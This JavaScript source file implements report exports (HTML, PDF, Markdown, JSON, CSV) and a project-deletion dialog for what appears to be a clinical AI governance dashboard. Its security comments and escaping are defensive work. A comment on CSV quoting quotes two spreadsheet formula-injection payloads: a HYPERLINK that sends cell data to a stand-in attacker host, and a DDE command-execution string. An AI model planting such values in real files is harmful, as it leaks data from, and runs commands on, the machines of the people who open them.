/* ============================================================
   Exports
   ============================================================ */
const STANDALONE_CSS = () => {
  const css=[...document.styleSheets].flatMap(sh=>{try{return [...sh.cssRules]}catch(e){return []}})
    .filter(r=>r.selectorText && /^(\.label|\.r-|\.overall|\.bars|\.bar|\.rtable|\.tag|\.pchip|\.disclaimer|\.eyebrow|\.gaplist|h1|h2|\.report)/.test(r.selectorText))
    .map(r=>r.cssText).join("\n");
  return `:root{--paper:#fff;--surface:#fff;--sunk:#EEF2F3;--ink:#13233A;--muted:#55667A;--rule:#C9D3D9;--teal:#0E6E66;--amber:#9A5806;--amber-soft:#F7E8CF;--red:#B42318;--red-soft:#F8DCD9;--green:#1F7A3E;--green-soft:#D7EEDD;--sans:"Public Sans","Segoe UI",system-ui,sans-serif;--display:"Archivo","Arial Narrow",Arial,sans-serif}
body{margin:0;background:#fff;color:var(--ink);font:15px/1.55 var(--sans)}main{max-width:900px;margin:0 auto;padding:32px 24px 60px}.r-wrap{overflow-x:auto}
@media print{main{padding:0}h2{break-after:avoid}.label{break-inside:avoid}}
${css}`;
};
function exportHTML(){
  // In the reader's language (R-55, D-60); the JSON and CSV exports stay English.
  const prov = storageNoteShown();
  return `<!DOCTYPE html><html lang="${esc(LOCALE)}" dir="${localeDir(LOCALE)}"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; img-src data:; base-uri 'none'; form-action 'none'">
<title>${esc(S.meta.solution||t("export.untitled"))} – ${esc(t(uiKey(UiSlot.TITLE_SUFFIX),uiName()))}</title>
<!-- No webfont link. The exported report is the artifact that gets emailed
     around a hospital and opened on clinical workstations, and a stylesheet
     link meant every one of those opens contacted a third party, carrying the
     referrer and the viewer's address, from a document containing vendor
     assessments and clinical rationale. STANDALONE_CSS() goes to real trouble
     to inline everything else; this was the one hole left in it. The font
     stacks below end in system-ui. -->
<style>${STANDALONE_CSS()}</style></head><body><main class="report">${spine().reportBody(true)}<p class="disclaimer" data-provenance><strong>${esc(t("export.storedIn",{label:prov.label}))}</strong> ${esc(prov.note)}</p><p class="disclaimer" data-fingerprint>${esc(t("export.fingerprint",contentHashes(storedRecord(S))))}</p></main></body></html>`;
}
/* PDF, via the browser's own print-to-PDF.

   No PDF library is bundled. Every option (jsPDF, pdfmake, html2pdf) is
   hundreds of kilobytes, and this dashboard has to stay one self-contained
   file small enough to read in one sitting -- a PDF writer would be larger
   than the entire application. Browsers already render HTML to PDF well, with
   correct fonts, selectable text and working links, which a canvas-based
   library does not give you.

   The report is printed from an offscreen iframe holding exactly the
   standalone HTML export, not from the live page. Printing the page would
   carry the app's own print stylesheet and its DOM state; this way the PDF and
   the HTML download are the same document, and what the user sees in the print
   preview is what the HTML export contains. */
function exportPDF(){
  const frame = document.createElement("iframe");
  frame.setAttribute("aria-hidden", "true");
  frame.setAttribute("title", t("print.frameTitle"));
  // The report is only read and printed, so it gets no script at all. It is same-origin
  // so print() is reachable, which means a script in it would run as the app; without
  // allow-scripts a markup slip in the report cannot (#155). allow-modals is what lets
  // the document's print dialog open.
  frame.setAttribute("sandbox", "allow-same-origin allow-modals");
  frame.style.cssText = "position:fixed;left:-9999px;top:0;width:820px;height:1160px;border:0";  // rtl-ok: off screen either way
  document.body.appendChild(frame);
  // srcdoc keeps it same-origin, so contentWindow.print() is reachable; a blob
  // URL would be a different origin in some browsers and throw.
  frame.srcdoc = exportHTML();   // xss-ok: the frame is sandboxed without allow-scripts (above); tests/test_injection.py
  // Set only now: a frame fires `load` for its first, blank document the moment it
  // is inserted, and a handler set before that printed a blank page first.
  frame.onload = () => {
    const win = frame.contentWindow;
    const go = () => {
      try{ win.focus(); win.print(); }
      catch(e){ toast(t("toast.printFailed")); }
      // Keep the frame alive briefly: some browsers run print() asynchronously
      // and removing it immediately cancels the dialog.
      setTimeout(() => frame.remove(), 60000);
    };
    // Wait for the webfonts, or the first page renders in a fallback face.
    const fonts = win.document.fonts;
    if(fonts && fonts.ready) fonts.ready.then(go).catch(go);
    else setTimeout(go, 400);
  };
  toast(t("toast.printOpening"));
}

function exportMD(){
  // The Markdown report reads in the reader's language (D-60), like the HTML one.
  const fw=spine(), all=fw.items(), ov=fw.score(S), m=S.meta, L=[], answers=fw.answers(S);
  // A definition's words are text too: a framework's name, a status label and a
  // checkpoint's name in a flag are escaped like a value a person typed.
  const st=s=>fw.statusKnown(s) ? line(fw.statusLabel(s)) : t("report.unanswered");
  // Every value a person typed goes through here. It ends the line (a value cannot
  // start a heading, a quotation or a table row) and backslash-escapes what Markdown
  // reads as structure: emphasis, links and images, code, tables and raw HTML. The
  // backslash itself goes first: escaping only the pipe turned a value's own `\|` into
  // an escaped backslash and a live pipe that ends the cell (#124). A viewer that
  // renders HTML would otherwise run a colleague's markup (#155).
  // And an address loses its credentials first (R-70): a renderer links a bare
  // https://user:pass@host/ and would print the password in the report. Done on
  // the text, after the newlines are gone, so the stored record is not touched.
  const line=s=>stripAddressCredentials(String(s??"").replace(/[\r\n\u2028\u2029]+/g," ")).text.replace(/[\\`*_\[\]()<>|!~]/g,c=>"\\"+c);
  const nm=id=>displayName(id), named={name:line(fw.name)};
  const fieldLine=(labelKey,value)=>t("md.fieldLine",{label:t(labelKey),value:line(value)});
  const shown=(map,v)=>v?(Object.hasOwn(map,v)?t(map[v]):v):"–";
  const prov=storageNoteShown();
  L.push(`# ${m.solution?line(m.solution):t("project.untitled")}: ${t(uiKey(UiSlot.TITLE_SUFFIX),named)}`,"");
  L.push(fieldLine("report.status",statusLabel(fw.status(S))),fieldLine("report.phase",phaseLabel(fw.phase(S))),fieldLine("report.org",m.org||"–"),fieldLine("report.developer",m.developer||"–"),fieldLine("report.sourcing",shown(SOURCING_KEY,m.sourcing)),fieldLine("report.riskTier",shown(RISK_KEY,m.riskTier)),fieldLine("report.sponsor",m.sponsor||"–"),fieldLine("report.nextReview",fw.nextReview(S)||"–"),fieldLine("md.team",m.reviewers||"–"),fieldLine("md.scope",m.scope||"–"),fieldLine("md.generated",TODAY()),fieldLine("md.language",LOCALE),fieldLine("md.storedIn",`${prov.label}. ${prov.note}`),"");
  const F=fw.flags(S); L.push(`## ${t("report.flags")}`,""); if(F.length) F.forEach(f=>L.push(`- **${t(f.sev==="red"?"status.red":"status.amber")}:** ${flagText(f,line)}`)); else L.push(t("md.none")); L.push("");
  L.push(`## ${t("report.readiness")}`,"",t(uiKey(UiSlot.MD_OVERALL),{pct:ov.pct,answered:ov.answered,total:ov.total}),"",`| ${t(uiKey(UiSlot.COL_CATEGORY))} | ${t("report.col.score")} |`,"|---|---|");
  fw.categories().forEach(c=>L.push(`| ${line(fw.categoryLabel(c.id))} | ${fw.score(S,all.filter(it=>it.category===c.id)).pct}% |`));
  L.push("",`## ${t(uiKey(UiSlot.CHECKPOINTS))}`,"",`| ${t(uiKey(UiSlot.COL_GATE))} | ${t("gate.decision")} | ${t("gate.by")} | ${t("report.col.date")} | ${t("md.rationale")} |`,"|---|---|---|---|---|");
  fw.gates().forEach(gate=>{const k=gate.id, g=fw.gateRecord(S,k); L.push(`| ${line(fw.gateLabel(k))}: ${line(fw.gateQuestion(k))} | ${g.decision?line(fw.optionLabel(g.decision)):t("md.notDecided")} | ${line(g.by)}${g.signedBy?` (${t("report.recordedBy",{who:line(nm(g.signedBy))})})`:""} | ${line(g.date)} | ${mdInlineMarkdown(g.rationale||"")} |`);});
  L.push("",`## ${t("md.openGaps")}`,"");
  const gaps=all.filter(it=>{const s=(answers[it.id]||{}).status; return !s||s==="notmet"||s==="partial";});
  if(gaps.length){ L.push(`| ${t(uiKey(UiSlot.COL_SECTION))} | ${t(uiKey(UiSlot.COL_ITEM))} | ${t("report.status")} | ${t("ci.owner")} | ${t("ci.due")} |`,"|---|---|---|---|---|"); gaps.forEach(it=>{const d=answers[it.id]||{}; L.push(`| ${line(it.section.n)} | ${line(fw.itemLabel(it))} | ${st(d.status)} | ${line(d.owner)} | ${line(d.due)} |`);}); }
  else L.push(t("md.none"));
  L.push("");
  if(fw.markdownExtras) L.push(...fw.markdownExtras({line, p:S}));
  L.push(`## ${t("report.history")}`,""); if(logWindowNote()) L.push(`_${logWindowNote()}_`,""); if(LOG.length) LOG.forEach(e=>L.push(`- ${line(String(e.at||"").slice(0,10))}: ${line(e.text)} (${line(nm(e.by))})`)); else L.push(t("md.none")); L.push("");
  L.push(`## ${t("report.appendix")}`,"");
  fw.sections().forEach(s=>{L.push(`### ${line(s.n)}. ${line(fw.sectionLabel(s))}`,""); all.filter(it=>it.section===s).forEach(it=>{const d=answers[it.id]||{}; L.push(`- [${line(it.category)}] ${line(fw.itemLabel(it))}: **${st(d.status)}**${d.evidence?` (${mdInlineMarkdown(d.evidence)})`:""}`); refsMarkdown(d,line).forEach(x=>L.push(`  - ${t("refs.title")}: ${x}`));}); L.push("");});
  L.push("---",`_${t(uiKey(UiSlot.MD_FOOTER),named)}_`,"",t("export.fingerprint",contentHashes(storedRecord(S))));
  return L.join("\n");
}
/* What the fingerprint is computed over, so a reader can recompute it from the file
   (examples/load_export.py does). */
const FINGERPRINT_OF = "The project record as stored, including its id, as compact canonical JSON in UTF-8: keys sorted at every level by UTF-16 code unit (as JavaScript sorts them, so 10 before 9), strings written as JSON.stringify writes them (a lone surrogate as its lowercase \\u escape), with updatedAt, updatedBy, cardUpdatedAt, _state, contentHash and generated left out.";
function projectJSON(p){
  const fw=spine(), all=fw.items(), answers=fw.answers(p);
  // The record as stored, not the copy filled in to show it: the fingerprint is the
  // stored record's, and a reader recomputes it from _state (storedRecord, #177).
  const record=storedRecord(p), state=clone(record); delete state.id;
  return {
    schema:fw.schemaId, generated:new Date().toISOString(), storage:storageNote(),
    project_id:p.id||null, fingerprint:{...contentHashes({...record, id:p.id}), of:FINGERPRINT_OF},
    status:fw.status(p).label, phase:fw.phase(p).label, next_review:fw.nextReview(p), flags:fw.flags(p),
    meta:p.meta, gates:p.gates, metrics:p.metrics,
    ...(fw.jsonExtras ? fw.jsonExtras(p) : {}),
    checklist:all.map(it=>({id:it.id,stage:it.section.n,principle:it.category,criterion:it.text,...(({status,evidence,owner,due})=>({status:status||null,evidence:evidence||"",owner:owner||"",due:due||""}))(answers[it.id]||{}), references:refsData(answers[it.id])})),
    scores:{overall:fw.score(p).pct,...Object.fromEntries(fw.categories().map(c=>[c.id,fw.score(p,all.filter(it=>it.category===c.id)).pct]))},
    _state:state
  };
}
/* One CSV field, quoted and defanged.

   RFC 4180 quoting is not enough here. Excel, LibreOffice and Google Sheets
   all treat a cell beginning with =, +, - or @ as a FORMULA, inside quotes or
   not, so a project named

     =HYPERLINK("https://evil.example/?x="&A1,"Review status")

   becomes a live link in every committee member's copy of the portfolio
   export. =cmd|'/c calc'!A0 is the DDE variant. The portfolio CSV exists
   specifically to be opened in a spreadsheet, and any writer on any single
   project controls one of its cells.

   A leading apostrophe makes the spreadsheet treat the rest as literal text.
   It is visible in the formula bar and not in the cell, which is the least
   intrusive fix that actually works. Leading tab and carriage return are
   included because they slip past a naive check on the first character and
   still leave a formula behind. */
const CSV_FORMULA = /^[=+\-@\t\r]/;
function csvField(value){
  let text = String(value ?? "");
  if(CSV_FORMULA.test(text)) text = "'" + text;
  return `"${text.replace(/"/g,'""')}"`;
}

function exportCSV(){
  const q=csvField;
  const head=["Project","Developer","Clinical sponsor","Risk tier","Lifecycle phase","Status","Readiness %","Next review","Flags","Archived","Last updated","Stored in"];
  const rows=dashData().map(r=>[r.p.meta.solution,r.p.meta.developer,r.p.meta.sponsor,r.p.meta.riskTier,spine().phase(r.p).label,r.st.label,r.score,r.nr||"",r.f.map(f=>f.text).join("; "),r.p.archived?"yes":"",(r.p.updatedAt||"").slice(0,10),storageNote().label]);
  return [head,...rows].map(r=>r.map(q).join(",")).join("\r\n");
}
const slug = s=> (s||"ai-solution").toLowerCase().replace(/[^a-z0-9]+/g,"-").replace(/^-|-$/g,"").slice(0,60) || "ai-solution";

/* Report an export to the server, where there is one. A failure is said out loud: the
   file was produced either way, but the user should not believe it was recorded when
   it was not (the same reasoning as the audit queue, #45). */
async function noteExport(format){
  if(!STORE || typeof STORE.recordExport!=="function") return;
  try{ await STORE.recordExport(format===ExportFormat.CSV ? null : CUR, format); }
  catch(e){ toast(t("toast.exportNotRecorded")); }
}

function download(filename,data){
  const types={html:"text/html",md:"text/markdown",json:"application/json",csv:"text/csv"};
  const ext=filename.split(".").pop();
  const url=URL.createObjectURL(new Blob([data],{type:(types[ext]||"text/plain")+";charset=utf-8"}));
  const a=document.createElement("a"); a.href=url; a.download=filename; document.body.appendChild(a); a.click(); a.remove();
  setTimeout(()=>URL.revokeObjectURL(url),1000); toast(t("toast.savedFile",{name:filename}));
}

/* Deleting a project destroys a governance record for everyone, and
   cannot be undone. A browser confirm() is one reflexive click away
   from that, and the click that does it looks exactly like every
   other confirm the user dismisses all day.

   So the name has to be typed. Not as friction for its own sake: it
   forces the user to read WHICH project they are about to destroy,
   which is the mistake that actually happens -- deleting the right
   kind of thing from the wrong row. */
function openDeleteDialog(){
  const name = S.meta.solution || t("project.untitled");
  /* Only the server keeps a version history, so only it can offer to destroy one.
     In the other modes deleting really does remove everything, and the plain
     wording is accurate; offering a choice with nothing behind it would not be. */
  const canPurge = typeof STORE.purgeVersions === "function";
  const heading = canPurge ? t("del.title") : t("del.titleForever");
  const consequence = canPurge
    ? `<p>${esc(t(uiKey(UiSlot.DEL_REMOVES)))}</p>
      <p><b>${esc(t("del.historyKeptTitle"))}</b> ${esc(t("del.historyKeptDetail"))}</p>`
    : `<p>${esc(t(uiKey(UiSlot.DEL_DESTROYS)))}</p>`;
  const purgeChoice = canPurge ? `
      <label style="display:flex;gap:8px;align-items:flex-start;margin:12px 0 2px">
        <input type="checkbox" id="delPurge" aria-describedby="delPurgeHint"
               style="margin-top:4px">
        <span><b>${esc(t("del.purgeChoice"))}</b></span>
      </label>
      <p id="delPurgeHint" class="small" style="color:var(--muted);margin-top:0">${esc(t("del.purgeHint"))}</p>` : "";
  const host = document.createElement("div");
  host.className = "modal-backdrop";
  host.innerHTML = `
    <div class="modal" role="dialog" aria-modal="true" aria-labelledby="delTitle">
      <h2 id="delTitle" style="margin-top:0">${esc(heading)}</h2>
      ${consequence}
      <p>${esc(t("del.archiveInstead"))}</p>${purgeChoice}
      <label for="delName">${tHtml("del.typeName",{},{name:`<b>${esc(name)}</b>`})}</label>
      <input type="text" id="delName" autocomplete="off" spellcheck="false"
             aria-describedby="delHint">
      <p id="delHint" class="small" style="color:var(--muted)">${esc(t("del.mustMatch"))}</p>
      <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:14px">
        <button class="btn" data-del-cancel>${esc(t("dash.cancel"))}</button>
        <button class="btn" data-del-archive>${esc(t("del.archiveButton"))}</button>
        <button class="btn danger" data-del-go disabled>${esc(canPurge ? t("setup.delete") : t("del.forever"))}</button>
      </div>
    </div>`;
  document.body.appendChild(host);

  const field = host.querySelector("#delName");
  const go = host.querySelector("[data-del-go]");
  const purgeBox = host.querySelector("#delPurge");
  if(purgeBox) purgeBox.addEventListener("change", () => {
    go.textContent = purgeBox.checked ? t("del.goPurge") : t("setup.delete");
  });
  const close = () => { host.remove(); document.removeEventListener("keydown", onKey); };
  const onKey = e => { if(e.key === "Escape") close(); };

  field.addEventListener("input", () => { go.disabled = field.value.trim() !== name; });
  field.addEventListener("keydown", e => { if(e.key === "Enter" && !go.disabled) go.click(); });
  host.querySelector("[data-del-cancel]").onclick = close;
  host.addEventListener("click", e => { if(e.target === host) close(); });
  document.addEventListener("keydown", onKey);

  host.querySelector("[data-del-archive]").onclick = () => {
    close();
    const v = !S.archived;
    S.archived = v;
    queuePatch(CUR, Object.assign({archived:v}, stamp()));
    writeLog(CUR, "Archived");
    renderMain(false);
    toast(t("toast.archived"));
  };

  go.onclick = async () => {
    if(field.value.trim() !== name) return;   // belt and braces
    const id = CUR;
    const destroy = !!(purgeBox && purgeBox.checked);
    go.disabled = true; go.textContent = t("del.deleting");
    close();
    delete pending[id]; clearTimeout(timers[id]);
    /* History first, then the project. If destroying the history fails, the project
       is NOT deleted, so nobody is left believing the data went when it did not.
       The other order would delete the record and then leave its history behind. */
    if(destroy){
      try{ await STORE.purgeVersions(id); }
      catch(err){ toast(t("toast.purgeFailed")); return; }
    }
    try{
      await STORE.remove(id); goHome();
      toast(destroy ? t("toast.deletedPurged") : t("toast.deleted"));
    }
    catch(err){
      toast(destroy ? t("toast.purgedNotDeleted")
                    : t("toast.deleteFailed"));
    }
  };

  setTimeout(() => field.focus(), 0);
}
